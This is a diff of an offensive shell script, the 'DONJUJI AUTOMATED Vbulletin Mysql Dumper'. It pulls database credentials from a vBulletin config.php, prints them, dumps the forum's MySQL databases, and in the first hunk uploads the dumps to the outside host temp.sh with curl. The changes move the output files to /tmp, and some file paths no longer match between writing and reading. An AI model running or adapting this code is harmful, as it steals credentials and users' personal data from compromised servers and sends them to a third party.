@@ -13,13 +13,13 @@ do
 "No Write Access: Dump To /tmp And Then Upload To Temp.sh")
 echo "****DONJUJI AUTOMATED Vbulletin Mysql Dumper****"
 echo " "
-grep -riah -E "^[$]config.*masterserver" core/includes/config.php | tr '\n' ' ' | sed -E "s/^.{41}/mysql --host=/" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" |sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/[']port['][]] = [']/ --port=/" | sed -E "s/[']username['][]] = [']/ --user=/" | sed -E "s/[']password['][]] = [']/ --password=/" | sed -E "s/['].*//" | sed -E "s/(.*)/\1/"| tee creds.txt | sed -E "s/(.*)/\1 information_schema  --disable-column-names -e \"SELECT TABLE_SCHEMA from COLUMNS where COLUMN_NAME LIKE 'birthday';\" /" | sh | sed -E "s/(.*)/:\1/" > vbdb.txt
+grep -riah -E "^[$]config.*masterserver" core/includes/config.php | tr '\n' ' ' | sed -E "s/^.{41}/mysql --host=/" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" |sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/[']port['][]] = [']/ --port=/" | sed -E "s/[']username['][]] = [']/ --user=/" | sed -E "s/[']password['][]] = [']/ --password=/" | sed -E "s/['].*//" | sed -E "s/(.*)/\1/"| tee /tmp/creds.txt | sed -E "s/(.*)/\1 information_schema  --disable-column-names -e \"SELECT TABLE_SCHEMA from COLUMNS where COLUMN_NAME LIKE 'birthday';\" /" | sh | sed -E "s/(.*)/:\1/" > /tmp/vbdb.txt
 cat creds.txt | sed -E "s/.*user=/Extracted Credentials: /" | sed -E "s/ --password=/:/"
 echo " "
-cat creds.txt vbdb.txt | sed -E "s/(mysql)(.*):(.*)/\1dump \3\2 \> \/tmp\/\3.sql/" | tee path.txt| sh
-sed -E "s/.*> /Full Path Of Dumped Database: /" path.txt
+cat creds.txt vbdb.txt | sed -E "s/(mysql)(.*):(.*)/\1dump \3\2 \> \/tmp\/\3.sql/" | tee /tmp/path.txt| sh
+sed -E "s/.*> \/tmp\//Full Path Of Dumped Database: /" path.txt
 echo "Uploading to temp.sh Please Be Patient"
-sed -E "s/.*> //" path.txt | sed -E "s/(.*)/curl -T \1 temp.sh/" | sh
+sed -E "s/.*> \/tmp\///" path.txt | sed -E "s/(.*)/curl -T \1 temp.sh/" | sh
 read -p '
                                           
                                           
@@ -39,11 +39,11 @@ DonJuji Loves You, Press Enter To Return To Menu'
 "Write Access: Dump To Current Frontend Directory")
 echo "****DON JUJI AUTOMATED Vbulletin Mysql Dumper****"
 echo " "
-grep -riah -E "^[$]config.*masterserver" core/includes/config.php | tr '\n' ' ' | sed -E "s/^.{41}/mysql --host=/" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" |sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/[']port['][]] = [']/ --port=/" | sed -E "s/[']username['][]] = [']/ --user=/" | sed -E "s/[']password['][]] = [']/ --password=/" | sed -E "s/['].*//" | sed -E "s/(.*)/\1/"| tee creds.txt | sed -E "s/(.*)/\1 information_schema  --disable-column-names -e \"SELECT TABLE_SCHEMA from COLUMNS where COLUMN_NAME LIKE 'birthday';\" /" | sh | sed -E "s/(.*)/:\1/" > vbdb.txt
+grep -riah -E "^[$]config.*masterserver" core/includes/config.php | tr '\n' ' ' | sed -E "s/^.{41}/mysql --host=/" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" |sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/\; [$]config[[][']MasterServer['][]][[][']//" | sed -E "s/[']port['][]] = [']/ --port=/" | sed -E "s/[']username['][]] = [']/ --user=/" | sed -E "s/[']password['][]] = [']/ --password=/" | sed -E "s/['].*//" | sed -E "s/(.*)/\1/"| tee /tmp/creds.txt | sed -E "s/(.*)/\1 information_schema  --disable-column-names -e \"SELECT TABLE_SCHEMA from COLUMNS where COLUMN_NAME LIKE 'birthday';\" /" | sh | sed -E "s/(.*)/:\1/" > /tmp/vbdb.txt
 cat creds.txt | sed -E "s/.*user=/Extracted Credentials: /" | sed -E "s/ --password=/:/"
 echo " "
-cat creds.txt vbdb.txt | sed -E "s/(mysql)(.*):(.*)/\1dump \3\2 \> .\/\3.sql/" | tee path.txt| sh
-sed -E "s/.*> ../Name Of Database Dumped To Current Directory: /" path.txt
+cat creds.txt vbdb.txt | sed -E "s/(mysql)(.*):(.*)/\1dump \3\2 \> \/tmp\/.\/\3.sql/" | tee /tmp/path.txt| sh
+sed -E "s/.*> \/tmp\/../Name Of Database Dumped To Current Directory: /" path.txt
 
 read -p '
                                           
